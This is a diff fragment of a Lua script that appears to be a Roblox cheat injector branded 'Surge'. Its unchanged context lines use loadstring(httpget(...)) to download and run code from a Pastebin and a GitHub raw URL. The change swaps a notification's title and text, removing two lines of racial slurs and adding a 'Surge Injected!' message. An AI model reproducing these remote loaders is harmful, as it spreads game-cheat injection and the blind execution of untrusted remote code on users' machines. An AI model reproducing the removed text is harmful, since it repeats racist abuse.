@@ -389,8 +389,8 @@ loadstring(httpget('https://pastebin.com/raw/5LGTLMg3'))()
 loadstring(httpget("https://raw.githubusercontent.com/PSWalloz/23ergtfb/refs/heads/main/DDD.lua"))()
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
-    Title = "niggers",-- OLD WAS "[SURGE]"
+    Title = "[SURGE]",
     Icon = "rbxassetid://1",
-    Text = "i hate niggeres",
+    Text = "Surge Injected!",
     Duration = 5
 })
